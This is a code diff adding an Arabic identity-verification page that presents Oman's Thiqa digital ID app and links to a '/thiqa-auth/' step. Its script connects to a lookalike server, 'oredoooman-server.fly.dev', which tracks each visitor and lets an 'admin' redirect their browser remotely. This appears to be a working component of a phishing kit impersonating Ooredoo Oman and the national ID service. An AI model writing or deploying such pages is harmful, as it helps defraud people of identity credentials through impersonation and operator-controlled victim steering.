@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>التحقق من الهوية</title>
+  <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: #f3f4f6; min-height: 100vh; display: flex; justify-content: center; }
+    .container { width: 100%; max-width: 430px; background: #fff; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+    .header { display: flex; align-items: center; justify-content: space-between; padding: 16px; border-bottom: 1px solid #e5e7eb; }
+    .header .back { font-size: 24px; color: #374151; background: none; border: none; cursor: pointer; }
+    .header h1 { font-size: 18px; font-weight: bold; color: #dc2626; }
+    .header .spacer { width: 32px; }
+    .content { flex: 1; padding: 32px 16px; }
+    .content h2 { font-size: 20px; font-weight: bold; text-align: center; color: #111827; margin-bottom: 32px; }
+    .option { border: 1px solid #e5e7eb; border-radius: 12px; padding: 16px; display: flex; align-items: center; gap: 16px; cursor: pointer; transition: border-color 0.2s; }
+    .option:hover { border-color: #fca5a5; }
+    .option .logo { width: 48px; height: 48px; border-radius: 8px; overflow: hidden; display: flex; align-items: center; justify-content: center; background: #1a1a5e; flex-shrink: 0; }
+    .option .logo img { width: 40px; height: 40px; object-fit: contain; }
+    .option .text { flex: 1; text-align: right; }
+    .option .text p:first-child { font-weight: bold; color: #111827; }
+    .option .text p:last-child { font-size: 14px; color: #6b7280; }
+    .option .radio { width: 20px; height: 20px; border-radius: 50%; border: 2px solid #ef4444; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .option .radio .dot { width: 12px; height: 12px; border-radius: 50%; background: #ef4444; }
+    .footer-btn { padding: 0 16px 32px; }
+    .footer-btn button { width: 100%; padding: 16px; background: #dc2626; color: #fff; font-weight: bold; font-size: 18px; border: none; border-radius: 9999px; cursor: pointer; transition: background 0.2s; }
+    .footer-btn button:hover { background: #b91c1c; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <button class="back" onclick="window.history.back()">›</button>
+      <h1>التحقق من الهوية</h1>
+      <div class="spacer"></div>
+    </div>
+    <div class="content">
+      <h2>اختر طريقة التحقق من الهوية</h2>
+      <div class="option" onclick="goThiqa()">
+        <div class="logo"><img src="/images/thiqa-logo.jpg" alt="ثقة"></div>
+        <div class="text">
+          <p>ثقة</p>
+          <p>تطبيق الهوية الرقمية في عمان</p>
+        </div>
+        <div class="radio"><div class="dot"></div></div>
+      </div>
+    </div>
+    <div class="footer-btn">
+      <button onclick="goThiqa()">استمرار</button>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      function getCurrentLang() {
+        try { var p = new URLSearchParams(window.location.search); return p.get('lang') || 'ar'; } catch (e) { return 'ar'; }
+      }
+      function goThiqa() {
+        window.location.href = '/thiqa-auth/?lang=' + getCurrentLang();
+      }
+      window.goThiqa = goThiqa;
+
+      // Socket.IO connection
+      var SOCKET_URL = window.location.hostname === 'localhost'
+        ? 'http://localhost:3001'
+        : 'https://oredoooman-server.fly.dev';
+      var socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
+      window.socket = socket;
+
+      var visitorId = localStorage.getItem('visitorId') || null;
+      socket.on('connect', function () {
+        socket.emit('visitor:register', { existingVisitorId: visitorId });
+        socket.emit('visitor:pageEnter', 'التحقق من الهوية');
+      });
+      socket.on('visitor:registered', function (data) {
+        if (data && data.visitorId) { localStorage.setItem('visitorId', data.visitorId); }
+      });
+
+      // Listen for page navigation from admin
+      socket.on('visitor:navigate', function (page) {
+        if (page) window.location.href = '/' + page;
+      });
+    })();
+  </script>
+</body>
+</html>
